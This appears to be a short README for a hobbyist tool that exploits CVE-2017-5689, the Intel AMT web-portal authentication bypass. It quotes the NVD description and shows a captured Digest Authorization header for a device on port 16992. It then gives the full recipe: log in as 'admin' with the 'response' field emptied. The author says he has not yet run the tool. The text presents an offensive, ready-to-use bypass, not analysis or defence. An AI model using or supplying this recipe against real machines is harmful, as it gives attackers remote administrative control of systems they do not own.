# Intel_IME_WebUI_bypass
does this even work?

This has some new things I have never done before and I am still testing it... haven't even run the darn thing yet but it looks like it works I guess.

################################################################################
This is a tool to persist an Intel IME admin session by modifying the GET 
request to have the "response:" field empty in every request. 
The web portal presented by the HARDWARE uses an MD5 in the response body to
authenticate and per the link given, can be bypassed by simply emptying it.
https://www.ssh.com/vulnerability/intel-amt/

CVE-2017-5689

  https://nvd.nist.gov/vuln/detail/CVE-2017-5689
 
  An unprivileged network attacker could gain system privileges to 
  provisioned Intel manageability SKUs: Intel Active Management Technology 
  (AMT) and Intel Standard Manageability (ISM). An unprivileged local attacker
  could provision manageability features gaining unprivileged network or local
  system privileges on Intel manageability SKUs: Intel Active Management 
  Technology (AMT), Intel Standard Manageability (ISM), and Intel Small 
  Business Technology (SBT).
 
###############################################################################

 Referer: http://192.168.0.44:16992/logon.htm

 Authorization: 
       Digest username="admin", 
       
       realm="Digest:72C40000000000000000000000000000", 
       
       nonce="WT7ZAQsLAABEyoVgz4/+bFmvwKIRUvUI", 
       
       uri="/index.htm", 
       
       response="9621f86ecc7d8f680213ddc2aae3f21d", 
       
       qop=auth, 
       
       nc=00000001,
       
       cnonce="96d5787909ac7ea7"
       
################################################################################

 WE MODIFY 'response=""' TO BE EMPTY WITH THE USERNAME "ADMIN" THAT IS ALL
 
################################################################################
